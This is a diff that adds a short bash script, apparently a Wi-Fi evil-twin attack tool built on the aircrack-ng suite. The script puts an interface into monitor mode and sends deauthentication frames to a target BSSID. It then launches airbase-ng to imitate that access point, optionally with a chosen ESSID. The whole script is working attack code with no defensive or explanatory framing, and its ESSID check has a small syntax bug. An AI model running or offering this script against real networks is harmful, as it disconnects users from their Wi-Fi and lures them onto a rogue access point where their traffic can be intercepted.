@@ -1,0 +1,24 @@
+#!/bin/bash
+
+BSSID=$1
+channel=$2
+TWIN_ESSID=$3
+
+airmon-ng start wlan0
+
+ifconfig wlan0mon down
+iwconfig wlan0mon channel $channel
+ifconfig wlan0mon up
+
+xterm -e aireplay-ng -a $BSSID -0 10 wlan0mon
+
+if [$TWIN_ESSID -eq ""] 
+then
+	xterm -e airbase-ng -a $BSSID -c $channel -W 1 -Z 2 wlan0mon &
+else
+	xterm -e airbase-ng -a $BSSID -c $channel --essid $TWIN_ESSID -W 1 -Z 2 wlan0mon &
+fi
+
+sleep 30s
+killall xterm
+airmon-ng stop wlan0mon
